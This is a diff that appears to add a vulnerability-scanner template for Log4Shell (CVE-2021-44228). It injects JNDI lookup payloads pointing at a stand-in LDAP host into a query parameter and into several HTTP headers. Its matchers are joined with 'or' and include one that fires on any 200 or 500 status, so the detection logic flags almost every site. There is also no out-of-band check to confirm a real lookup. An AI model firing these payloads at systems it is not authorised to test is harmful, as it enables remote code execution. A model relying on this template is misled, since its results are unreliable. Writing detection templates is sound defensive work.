@@ -1,0 +1,54 @@
+id: log4shell-detect
+
+info:
+  name: Log4Shell RCE (CVE-2021-44228)
+  author: security-lab
+  severity: critical
+  description: Apache Log4j2 Remote Code Execution via JNDI Injection
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
+  tags: cve,cve2021,log4j,rce,critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/?test=${jndi:ldap://test.local/a}"
+
+    headers:
+      User-Agent: "${jndi:ldap://test.local/a}"
+      X-Forwarded-For: "${jndi:ldap://test.local/a}"
+      X-Real-IP: "${jndi:ldap://test.local/a}"
+      Referer: "${jndi:ldap://test.local/a}"
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      # Look for JNDI lookup attempts in response
+      - type: word
+        words:
+          - "javax.naming.CommunicationException"
+          - "javax.naming.NamingException"
+          - "Error looking up JNDI resource"
+          - "${jndi"
+        part: body
+
+      # Check if server processes JNDI
+      - type: regex
+        regex:
+          - "\\$\\{jndi:.*\\}"
+        part: body
+
+      # Status check
+      - type: dsl
+        dsl:
+          - "status_code == 200 || status_code == 500"
+
+    extractors:
+      - type: regex
+        name: jndi_processing
+        regex:
+          - '.*JNDI.*'
+          - '.*jndi.*'
+        part: body
